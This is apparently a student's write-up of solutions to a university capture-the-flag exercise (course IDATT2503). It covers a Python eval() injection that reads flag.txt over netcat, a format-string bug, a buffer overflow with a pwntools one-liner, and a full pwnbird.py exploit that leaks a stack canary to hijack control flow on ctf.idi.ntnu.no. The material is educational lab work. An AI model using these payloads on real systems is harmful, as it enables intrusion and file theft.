# IDATT2503 - Solution Exercise 2



1. **1. Writeup PyCalc challenge**

   **Summary**

   The PyCalc online calculator is  vulnerable to arbitrary code injection via the "op" command, which uses  eval(), an unsafe function when untrusted user input is passed to it.  Arbitrary Python code can be injected and executed server side.

   **Steps to reproduce**

   1. Connect to the calculator using: nc 10.9.8.1 5006
   2. Enter: op open('flag.txt').read()
   3. View the flag

   **Impact**

   The bug opens the door to execution of  arbitrary Python code inside the Docker container. The impact can be  denial of service by crashing the calculator app, launching network  attacks using the calculator as an anonymous proxy, accessing internal  NTNU assets behind the firewall.

   **2. Reversing**

   The vulnerability is a format string  vulnerability. A user-controlled buffer should never be passed as the  format argument to the *printf family of functions because format  placeholders (e.g., %s) would be interpreted by the function, and lead  to a number of different possibilities of leaking sensitive information  and writing to arbitrary memory locations. The fix is to use the  function call like printf("%s", str);

   **3. Hello (ctf.idi.ntnu.no)**

   This is a classic buffer overflow. Using checksec we can see that the binary is not compiled with PIE (position  independent executable), therefore the address we see in disassembly  will be the address we want to write over the return address with. There is also no stack canary. NX is enabled, so we cannot use our own  shellcode to exfiltrate the flag.

   First step is disassembly:

   objdump -D -M intel hello

   Examining the disassembly we can see a  function "flag" at address 0x0000000000401192 that does some work with a file (fopen/fread/puts libc function calls). Next, looking at main(),  we can see the stack is enlarged by 0x20 in the function prologue:

    40123f:    48 83 ec 20       sub   rsp,0x20

   So we can assume the buffer written to  by the gets() call later on in main() is 32 bytes. The binary is 64-bit, so we'll need to overwrite 8 bytes of rbp and an 8 byte return address, in addition to the 32 bytes of the buffer.

   Without much more effort, we can construct the following exploit:

   python3 -c 'import sys; from pwn import p64; sys.stdout.buffer.write(b"A"*40+p64(0x0000000000401192)+b"\n")' | nc 10.9.8.1 5009

   Note that we need to append a trailing  newline "\n" because netcat will send data over the TCP connection when  it encounters a newline. This is not needed (but harmless) if you are  testing with the binary locally.

   **4. ctf.idi.ntnu.no bird**

   This challenge is a bit more advanced  and the attacker needs to chain together two vulnerabilities: a format  string vulnerability and a buffer overflow to control the instruction  pointer.

   Steps

   1. Reverse the binary, we see a call to printf passing the user buffer as the format string, so we know we can leak the stack
   2. Find the offset to flag(), note this
   3. Leak the stack: python3 -c "print('%p '*32)" | ./bird
   4. Look for addresses on the stack pointing to the program section (map in /proc/`pidof bird`/maps) - this can be found for example in %24$p
   5. Look for the stack canary (64 bit value with \x00 least significant byte) - found in %23$p
   6. We see from reversing that an unsafe call to gets is used on the same buffer as above
   7. Given the stack layout, we need: <128 bytes to fill the  buffer><8 bytes><8 bytes canary><8 bytes frame  pointer><8 bytes address of flag()>

   The leaks are necessary because the binary is compiled with PIE and stack protection (as reported by checksec).

   See pwnbird.py for rest of exploit.

   gdb helps for exploration and calculation of offset to flag() :)

   ```python
   --- PoC pwnbird.py ---
   
   from pwn import *
   import sys
   
   \#p = process('./bird')
   p = remote('ctf.idi.ntnu.no',5000)
   
   p.readuntil(b': ')
   
   p.send(b'%23$p %24$p\n')
   line = p.readline()
   print(line)
   canary,addr = line.split()
   canary = int(canary, 16)
   addr = int(addr, 16)
   
   addr = addr - 0x19b # Difference between leaked stack address and flag()
   print("canary:",hex(canary))
   print("flag() addr:",hex(addr))
   
   print(p.readuntil(b': '))
   
   p.send(b'A'*136+p64(canary)+b'A'*8+p64(addr)+b'\n')
   
   try:
     print(p.readline()) # Thanks
     print(p.readline()) # flag
   except EOFError:
     print("eof")
   
   \---
   ```
